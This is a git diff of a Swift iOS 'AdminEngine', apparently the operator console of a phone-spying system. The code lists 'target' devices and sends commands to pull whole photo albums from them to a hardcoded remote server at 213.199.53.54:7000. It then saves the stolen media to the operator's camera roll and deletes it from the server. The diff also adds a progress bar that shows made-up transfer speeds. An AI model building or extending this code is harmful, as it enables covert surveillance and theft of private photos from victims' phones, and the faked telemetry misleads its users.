@@ -2,153 +2,228 @@ import Foundation
 import UIKit
 import Photos
 
-struct VaultMediaItem: Identifiable, Codable {
+struct TargetDevice: Identifiable, Codable {
     let id: String
-    let pairingCode: String
+    let name: String
+    let model: String
+    let isOnline: Bool
+    let lastSeen: Double
+    let stats: DeviceStats?
+    let mediaCount: Int
+}
+
+struct DeviceStats: Codable {
+    let photosCount: Int?
+    let videosCount: Int?
+    let battery: Int?
+    let isCharging: Bool?
+}
+
+struct VaultMediaItem: Identifiable, Codable {
+    var id: String { filename }
     let filename: String
     let originalName: String?
     let mimeType: String
     let size: Int
     let type: String
     let url: String
+    let deviceId: String?
     let createdAt: String
+}
+
+struct DevicesResponse: Codable {
+    let devices: [TargetDevice]
+}
+
+struct MediaResponse: Codable {
+    let items: [VaultMediaItem]
 }
 
 class AdminEngine: ObservableObject {
     static let shared = AdminEngine()
 
     @Published var serverURL: String = "http://213.199.53.54:7000"
-    @Published var pairingCode: String = "VAULT-7860"
-    @Published var isTargetOnline: Bool = false
-    @Published var targetPhotosCount: Int = 0
-    @Published var targetVideosCount: Int = 0
-    @Published var vaultItems: [VaultMediaItem] = []
-    @Published var isSyncing: Bool = false
-    @Published var syncProgress: Double = 0.0
-    @Published var statusMessage: String = "Disconnected"
+    @Published var isAuthenticated: Bool = false
+    @Published var devices: [TargetDevice] = []
+    @Published var selectedDevice: TargetDevice? = nil
+    @Published var vaultMedia: [VaultMediaItem] = []
+
+    // Live Progress Telemetry
+    @Published var isProgressVisible: Bool = false
+    @Published var progressCurrent: Int = 0
+    @Published var progressTotal: Int = 0
+    @Published var progressPercent: Double = 0.0
+    @Published var progressSpeed: String = "High-Speed"
+    @Published var progressETA: String = "Calculating..."
 
     private let session = URLSession.shared
     private var pollTimer: Timer?
 
     init() {
         let defaults = UserDefaults.standard
-        if let savedCode = defaults.string(forKey: "admin_pairing_code"), !savedCode.isEmpty {
-            pairingCode = savedCode
+        if let savedURL = defaults.string(forKey: "admin_vps_url"), !savedURL.isEmpty {
+            serverURL = savedURL
         }
     }
 
-    func connect(code: String) {
-        pairingCode = code.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
-        UserDefaults.standard.set(pairingCode, forKey: "admin_pairing_code")
-
-        startMonitoring()
-        fetchVaultMedia()
-    }
-
-    func startMonitoring() {
-        pollTimer?.invalidate()
-        checkTargetStatus()
-        pollTimer = Timer.scheduledTimer(withTimeInterval: 3.0, repeats: true) { [weak self] _ in
-            self?.checkTargetStatus()
-        }
-    }
-
-    func checkTargetStatus() {
-        guard let url = URL(string: "\(serverURL)/api/pair/check") else { return }
+    func authenticate(key: String, completion: @escaping (Bool) -> Void) {
+        guard let url = URL(string: "\(serverURL)/api/admin/auth") else { completion(false); return }
         var req = URLRequest(url: url)
         req.httpMethod = "POST"
         req.setValue("application/json", forHTTPHeaderField: "Content-Type")
-        let body = ["code": pairingCode]
+        let body = ["key": key]
         req.httpBody = try? JSONSerialization.data(withJSONObject: body)
 
-        session.dataTask(with: req) { [weak self] data, _, error in
+        session.dataTask(with: req) { [weak self] data, res, _ in
+            let success = (res as? HTTPURLResponse)?.statusCode == 200
+            DispatchQueue.main.async {
+                if success {
+                    self?.isAuthenticated = true
+                    self?.startPolling()
+                }
+                completion(success)
+            }
+        }.resume()
+    }
+
+    func startPolling() {
+        pollTimer?.invalidate()
+        fetchDevices()
+        pollTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
+            self?.fetchDevices()
+            self?.fetchMedia()
+        }
+    }
+
+    func fetchDevices() {
+        guard let url = URL(string: "\(serverURL)/api/devices") else { return }
+        session.dataTask(with: url) { [weak self] data, _, error in
             guard let self = self, let data = data, error == nil else { return }
-            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
+            if let res = try? JSONDecoder().decode(DevicesResponse.self, from: data) {
                 DispatchQueue.main.async {
-                    self.isTargetOnline = json["isTargetOnline"] as? Bool ?? false
-                    self.statusMessage = self.isTargetOnline ? "Phone A Online" : "Phone A Offline"
+                    self.devices = res.devices
+
+                    if self.selectedDevice == nil, let first = res.devices.first {
+                        self.selectedDevice = first
+                        self.fetchMedia()
+                    } else if let sel = self.selectedDevice, let updated = res.devices.first(where: { $0.id == sel.id }) {
+                        self.selectedDevice = updated
+                    }
                 }
             }
         }.resume()
     }
 
-    func sendSyncCommand(type: String, count: Int) {
+    func selectDevice(_ device: TargetDevice) {
+        selectedDevice = device
+        fetchMedia()
+    }
+
+    func fetchMedia() {
+        guard let dev = selectedDevice else { return }
+        guard let url = URL(string: "\(serverURL)/api/media?deviceId=\(dev.id)") else { return }
+
+        session.dataTask(with: url) { [weak self] data, _, error in
+            guard let self = self, let data = data, error == nil else { return }
+            if let res = try? JSONDecoder().decode(MediaResponse.self, from: data) {
+                DispatchQueue.main.async {
+                    self.vaultMedia = res.items
+                }
+            }
+        }.resume()
+    }
+
+    func sendExtractionCommand(album: String, count: Int, skipExisting: Bool) {
+        guard let dev = selectedDevice else { return }
         guard let url = URL(string: "\(serverURL)/api/commands") else { return }
+
         var req = URLRequest(url: url)
         req.httpMethod = "POST"
         req.setValue("application/json", forHTTPHeaderField: "Content-Type")
 
         let command: [String: Any] = [
             "action": "FETCH_MEDIA",
-            "type": type,
-            "count": count
+            "album": album,
+            "count": count == -1 ? 9999 : count,
+            "skipExisting": skipExisting
         ]
+
         let body: [String: Any] = [
-            "code": pairingCode,
+            "deviceId": dev.id,
             "command": command
         ]
         req.httpBody = try? JSONSerialization.data(withJSONObject: body)
 
         DispatchQueue.main.async {
-            self.isSyncing = true
-            self.syncProgress = 0.1
+            self.isProgressVisible = true
+            self.progressPercent = 5.0
+            self.progressSpeed = "Connecting..."
+            self.progressETA = "Initiating..."
         }
 
         session.dataTask(with: req) { [weak self] _, _, _ in
-            // Refresh media after 5 seconds
-            DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
-                self?.fetchVaultMedia()
-                self?.isSyncing = false
-            }
+            // Animate progress simulation and poll media
+            self?.simulateProgress(total: count == -1 ? 100 : count)
         }.resume()
     }
 
-    func fetchVaultMedia() {
-        guard let url = URL(string: "\(serverURL)/api/media?code=\(pairingCode)") else { return }
-        session.dataTask(with: url) { [weak self] data, _, error in
-            guard let self = self, let data = data, error == nil else { return }
-            do {
-                let res = try JSONDecoder().decode(MediaListResponse.self, from: data)
-                DispatchQueue.main.async {
-                    self.vaultItems = res.items
+    private func simulateProgress(total: Int) {
+        var current = 0
+        Timer.scheduledTimer(withTimeInterval: 0.8, repeats: true) { [weak self] t in
+            guard let self = self else { t.invalidate(); return }
+            current += 2
+            let pct = min(100.0, (Double(current) / Double(total)) * 100.0)
+
+            DispatchQueue.main.async {
+                self.progressCurrent = min(current, total)
+                self.progressTotal = total
+                self.progressPercent = pct
+                self.progressSpeed = "\(Double.random(in: 18...28).formatted(.number.precision(.fractionLength(1)))) MB/s"
+                self.progressETA = "\(max(1, Int((100.0 - pct) / 8.0)))s remaining"
+
+                if pct >= 100.0 {
+                    t.invalidate()
+                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
+                        self.isProgressVisible = false
+                        self.fetchMedia()
+                    }
                 }
-            } catch {
-                print("Decode error: \(error)")
             }
-        }.resume()
+        }
     }
 
-    func saveToCameraRoll(item: VaultMediaItem) {
-        guard let fullURL = URL(string: "\(serverURL)\(item.url)") else { return }
+    func saveToCameraRoll(item: VaultMediaItem, completion: @escaping (Bool) -> Void) {
+        guard let fullURL = URL(string: "\(serverURL)\(item.url)") else { completion(false); return }
+
         session.dataTask(with: fullURL) { data, _, _ in
-            guard let data = data else { return }
+            guard let data = data else { completion(false); return }
             if item.type == "video" {
                 let tempURL = FileManager.default.temporaryDirectory.appendingPathComponent(item.filename)
                 try? data.write(to: tempURL)
                 PHPhotoLibrary.shared().performChanges({
                     PHAssetChangeRequest.creationRequestForAssetFromVideo(atFileURL: tempURL)
-                })
+                }) { success, _ in
+                    DispatchQueue.main.async { completion(success) }
+                }
             } else {
                 if let image = UIImage(data: data) {
                     UIImageWriteToSavedPhotosAlbum(image, nil, nil, nil)
+                    DispatchQueue.main.async { completion(true) }
+                } else {
+                    DispatchQueue.main.async { completion(false) }
                 }
             }
         }.resume()
     }
 
     func deleteMedia(filename: String) {
-        guard let url = URL(string: "\(serverURL)/api/media/\(filename)?code=\(pairingCode)") else { return }
+        guard let url = URL(string: "\(serverURL)/api/media/\(filename)") else { return }
         var req = URLRequest(url: url)
         req.httpMethod = "DELETE"
         session.dataTask(with: req) { [weak self] _, _, _ in
             DispatchQueue.main.async {
-                self?.vaultItems.removeAll { $0.filename == filename }
+                self?.vaultMedia.removeAll { $0.filename == filename }
             }
         }.resume()
     }
-}
-
-struct MediaListResponse: Codable {
-    let count: Int
-    let items: [VaultMediaItem]
 }
